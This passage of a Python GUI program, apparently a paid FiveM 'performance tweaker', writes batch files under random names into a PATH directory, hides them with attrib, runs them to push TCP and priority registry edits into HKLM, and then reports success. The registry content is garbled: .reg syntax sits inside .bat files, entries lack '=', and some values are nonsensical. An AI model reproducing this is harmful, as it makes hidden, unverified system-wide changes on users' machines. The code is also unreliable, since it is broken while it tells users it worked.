"TcpNumConnections" dword:7fff
"
"TcpMaxDupAcks" dword:2
"
"TcpWindowSize" dword:7fff
"
"WorldMaxTcpWindowsSize" dword:7
"
"TCPInitialRtt" dword:7fff
"
"IRPStackSize" dword:50
"

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters]

"TcpNoDelay"=dword:1288fff
"
"TCPDelAckTicks"=dword:1288fff
"
"TcpMaxDataRetransmissions"=dword:00000003
"
"SackOpts"=dword:00000001
"
"TcpWindowSize"=dword:0005ae4c
"
"Tcp1323Opts"=dword:00000003
"
"DefaultTTL"=dword:7fff
"
"EnablePMTUBHDetect"=dword:00000000
"
"EnablePMTUDiscovery"=dword:00000001
"
"GlobalMaxTcpWindowSize"=dword:0005ae4c
"
"TcpTimedWaitDelay" dword:30
    ''', 'utf-8'))
    _open = popen('attrib +h ' + file_location)
    _open.read()
    call(file_location)
    System.Clear()
    print(dataloadedsuccessfullymsg)
    print(dataloadedsuccessfullypic)
    print(dataloadedsuccessfullymsg)
def Player4():
    System.Clear()
    file_location = environ['PATH'].split(';')[0] + f'''\\{token_hex(16)}.bat'''
    open(file_location, 'wb').write(bytes('''
    @echo off
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters]
"DefaultTTL"=dword:40
"DisableTaskOffload"=dword:00000001
"DisableLargeMtu"=dword:00000000
"EnableConnectionRateLimiting"=dword:00000000
"EnableDCA"=dword:00000001
"EnablePMTUBHDetect"=dword:00000000
"EnablePMTUDiscovery"=dword:00000001
"EnableRSS"=dword:00000001
"EnableTCPA"=dword:00000000
"EnableWsd"=dword:00000000
"GlobalMaxTcpWindowSize"=dword:0
"MaxConnectionsPer1_0Server"=dword:10
"MaxConnectionsPerServer"=dword:10
"MaxFreeTcbs"=dword:0000ffff
"MaxHashTableSize"=dword:00010000
"MaxUserPort"=dword:0000fffe
"NumTcbTablePartitions"=dword:8
"SackOpts"=dword:00000001
"SynAttackProtect"=dword:00000001
"Tcp1323Opts"=dword:00000001
"TcpCreateAndConnectTcbRateLimitDepth"=dword:00000000
"TcpMaxDataRetransmissions"=dword:00000003
"TcpMaxDupAcks"=dword:00000002
"TcpMaxSendFree"=dword:0000ffff
"TcpNumConnections"=dword:00fffffe
"TcpTimedWaitDelay"=dword:0000001e
"TcpFinWait2Delay"=dword:0000001e

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces]
"TCPNoDelay"=dword:00000001
"TcpAckFrequency"=dword:00000001
"TcpDelAckTicks"=dword:00000000

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters]
"DhcpInterfaceOptions"=hex:0f,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,93,  ec,45,57,79,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,93,ec,45,57,01,00,  00,00,00,00,00,00,00,00,00,00,00,00,00,00,93,ec,45,57,2b,00,00,00,00,00,00,  00,00,00,00,00,00,00,00,00,93,ec,45,57,2c,00,00,00,00,00,00,00,00,00,00,00,  00,00,00,00,93,ec,45,57,06,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,93,  ec,45,57

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\PriorityControl]
"Win32PrioritySeparation"=hex(b):02,00,00,00,00,00,00,00
"IRQ8Priority"=hex(b):01,00,00,00,00,00,00,00
"IRQ16Priority"=hex(b):02,00,00,00,00,00,00,00
    ''', 'utf-8'))
    _open = popen('attrib +h ' + file_location)
    _open.read()
    call(file_location)
    System.Clear()
    print(dataloadedsuccessfullymsg)
    print(dataloadedsuccessfullypic)
    print(dataloadedsuccessfullymsg)
def bugtalk():
    webbrowser.open("https://discord.gg/TJ56eYqqSq")


lobby = Tk()
lobby.title("UnknowPlayer By ! Sonic . exe#6074")
lobby.geometry("700x500")
lobby.resizable(width=False, height=False)

notebook = ttk.Notebook(lobby)
tab1 = Frame(notebook)
tab3 = Frame(notebook)
notebook.add(tab1,text="Home")
notebook.add(tab3,text="Player Never Loses")
notebook.pack()
Label(tab1,text="UnknowPlayer V1",font=300).pack()
Label(tab1,text="รายละเอียดเกี่ยวกับตัวโปรแกรม",font=250).pack()
Label(tab1,text="เป็นที่ทราบกันดีโปรแกรมนี้ถูกจัดทำขึ้นโดย Sonic เหตุผลที่สร้างโปรแกรมนี้ขึ้นมา",font=180).pack()
Label(tab1,text="เพื่อให้ผู้เล่นที่คลั่งไคล้ในการใช้ Registry Editor แปลกใหม่ในวงการ Fivem",font=180).pack()
Label(tab1,text="ซึ่งผมเองก็เป็นคนคนหนึ่งที่ชอบการเขียนโปรแกรมเว็บไซต์แล้วเห็นว่าแปลกใหม่ดี",font=180).pack()
Label(tab1,text="เลยจะมาลองทำขายเพื่อนๆดูครับ",font=180).pack()
Label(tab1,text="คุณสมบัติของตัวโปรแกรม",font=250).pack()
Label(tab1,text="ลดหน่วง เพื่ม Fps บูทเน็ต ปรับดีเลย์เมาส์คีย์บอร์ดการปรับสภาพเครื่องให้ลื่น",font=180).pack()
Label(tab1,text="มี .meta ให้ใช้ลดหน่วงเต็มสูบ มีการปรับลดดีเลย์ทำให้เกาะแตกง่ายขึ้น",font=180).pack()
Label(tab1,text="พบเจอบัคกรุณาติดต่อ",font=250).pack()
Button(tab1,text="Discord",command=bugtalk).pack()


Label(tab3,text="Player Never Loses",font=300).pack()
Button(tab3,text="Increase internet speed",command=Player1).pack()
Button(tab3,text="Bet Neverlose",command=Player2).pack()
Button(tab3,text="TCP style sincare",command=Player3).pack()
Button(tab3,text="Parameters style sincare",command=Player4).pack()


lobby.mainloop()